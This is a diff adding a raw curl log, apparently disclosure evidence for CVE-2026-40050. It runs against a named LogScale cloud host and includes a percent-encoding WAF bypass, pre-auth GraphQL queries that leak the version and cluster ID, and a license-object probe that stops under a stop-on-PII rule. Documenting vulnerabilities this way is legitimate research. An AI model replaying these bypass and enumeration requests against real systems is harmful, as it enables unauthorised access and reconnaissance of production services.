@@ -1,0 +1,159 @@
+# Raw curl output captured during the 2026-06-01 validation run.
+#
+# Host: ingest.oem-2-1.logscale.us-2.crowdstrike.com
+# Identifying header was attached to every request; redacted to neutral
+# X-Research-Probe in this public copy. Timestamps preserved.
+#
+# Vendor-side log correlation: the same window (22:50 — 22:56 UTC,
+# 2026-06-01) should show these exact request paths in CDN/WAF logs.
+
+================================================================================
+# Phase 1A — baseline (WAF active)
+# 2026-06-01T22:50:26Z
+================================================================================
+$ curl -isS \
+       -H "X-Research-Probe: defender-checklist" \
+       -H "User-Agent: cve-2026-40050-checker/1.0" \
+       "https://ingest.oem-2-1.logscale.us-2.crowdstrike.com/api/v1/internal/status"
+HTTP/1.1 403 Forbidden
+Server: nginx
+Date: Mon, 01 Jun 2026 22:50:26 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+
+<html>
+<head><title>403 Forbidden</title></head>
+<body bgcolor="white">
+<center><h1>403 Forbidden</h1></center>
+</body>
+</html>
+
+================================================================================
+# Phase 1B — single-character percent-encoding bypass
+# 2026-06-01T22:50:29Z (+3s)
+================================================================================
+$ curl -isS \
+       -H "X-Research-Probe: defender-checklist" \
+       -H "User-Agent: cve-2026-40050-checker/1.0" \
+       "https://ingest.oem-2-1.logscale.us-2.crowdstrike.com/api/v1/%69nternal/status"
+HTTP/1.1 200 OK
+Server: nginx
+Date: Mon, 01 Jun 2026 22:50:29 GMT
+Content-Type: application/json
+Content-Length: 96
+
+{"status": "OK", "version": "1.234.3--build-5556--sha-e177ed90d9696c7a16f6f6ca1147fcd044528327"}
+
+================================================================================
+# Phase 1C — double-slash variant (different handler reached)
+# 2026-06-01T22:50:33Z
+================================================================================
+$ curl -isS \
+       -H "X-Research-Probe: defender-checklist" \
+       -H "User-Agent: cve-2026-40050-checker/1.0" \
+       "https://ingest.oem-2-1.logscale.us-2.crowdstrike.com/api/v1//internal/status"
+HTTP/1.1 401 Unauthorized
+WWW-Authenticate: Bearer realm="Bearer"
+Server: nginx
+Content-Length: 0
+
+================================================================================
+# Phase 2A — GraphQL UI uncovered by WAF
+# 2026-06-01T22:51:03Z
+================================================================================
+$ curl -isS \
+       -H "X-Research-Probe: defender-checklist" \
+       -H "User-Agent: cve-2026-40050-checker/1.0" \
+       "https://ingest.oem-2-1.logscale.us-2.crowdstrike.com/graphql"
+HTTP/1.1 200 OK
+Server: nginx
+Date: Mon, 01 Jun 2026 22:51:03 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 4953
+Set-Cookie: LogScaleVersion=1.234.3--build-5556--sha-e177ed90d9696c7a16f6f6ca1147fcd044528327
+Content-Security-Policy: ...
+
+<!DOCTYPE html><html>...LogScale GraphQL UI (4953 bytes)...</html>
+
+================================================================================
+# Phase 2B — schema reachability
+# 2026-06-01T22:52:01Z
+================================================================================
+$ curl -isS \
+       -H "X-Research-Probe: defender-checklist" \
+       -H "User-Agent: cve-2026-40050-checker/1.0" \
+       -H "Content-Type: application/json" \
+       -d '{"query":"{__typename}"}' \
+       "https://ingest.oem-2-1.logscale.us-2.crowdstrike.com/graphql"
+HTTP/1.1 200 OK
+Content-Type: application/json
+Content-Length: 31
+
+{"data":{"__typename":"Query"}}
+
+================================================================================
+# Phase 2C — pre-auth metadata leak (meta)
+# 2026-06-01T22:52:05Z
+================================================================================
+$ curl -isS \
+       -H "X-Research-Probe: defender-checklist" \
+       -H "User-Agent: cve-2026-40050-checker/1.0" \
+       -H "Content-Type: application/json" \
+       -d '{"query":"{ meta { __typename version clusterId environment } }"}' \
+       "https://ingest.oem-2-1.logscale.us-2.crowdstrike.com/graphql"
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"data":{"meta":{
+    "__typename":"HumioMetadata",
+    "version":"1.234.3--build-5556--sha-e177ed90d9696c7a16f6f6ca1147fcd044528327",
+    "clusterId":"30Fyrm4XK8v9g7jkGwcOcC8Jp0yoZDUxgy9quv7O5jwj/lD1XE2oZJYyglblZ",
+    "environment":"ON_CLOUD"
+}}}
+
+================================================================================
+# Phase 2D — introspection probe (expected: disabled)
+# 2026-06-01T22:52:08Z
+================================================================================
+$ curl -isS \
+       -H "X-Research-Probe: defender-checklist" \
+       -H "User-Agent: cve-2026-40050-checker/1.0" \
+       -H "Content-Type: application/json" \
+       -d '{"query":"{ __schema { queryType { name } } }"}' \
+       "https://ingest.oem-2-1.logscale.us-2.crowdstrike.com/graphql"
+HTTP/1.1 400 Bad Request
+
+{"errors":[{"message":"Query reducing error: Introspection is not allowed.",...}]}
+
+================================================================================
+# Phase 2E — guard-rail check (viewer)
+# 2026-06-01T22:52:11Z
+================================================================================
+$ curl -isS \
+       -H "X-Research-Probe: defender-checklist" \
+       -H "User-Agent: cve-2026-40050-checker/1.0" \
+       -H "Content-Type: application/json" \
+       -d '{"query":"{ viewer { username email } }"}' \
+       "https://ingest.oem-2-1.logscale.us-2.crowdstrike.com/graphql"
+HTTP/1.1 200 OK
+
+{"data":null,"errors":[{"message":"Authorization Required.","path":["viewer"],...}]}
+
+================================================================================
+# Phase 3C — installedLicense (typename only)
+# 2026-06-01T22:55:30Z
+================================================================================
+$ curl -isS \
+       -H "X-Research-Probe: defender-checklist" \
+       -H "User-Agent: cve-2026-40050-checker/1.0" \
+       -H "Content-Type: application/json" \
+       -d '{"query":"{ installedLicense { __typename } }"}' \
+       "https://ingest.oem-2-1.logscale.us-2.crowdstrike.com/graphql"
+HTTP/1.1 200 OK
+
+{"data":{"installedLicense":{"__typename":"OnPremLicense"}}}
+
+# STOP. License sub-fields not enumerated per stop-on-PII rule of
+# engagement. The reachability shape is demonstrated; the customer-
+# identifying contents of the OnPremLicense object are not extracted.
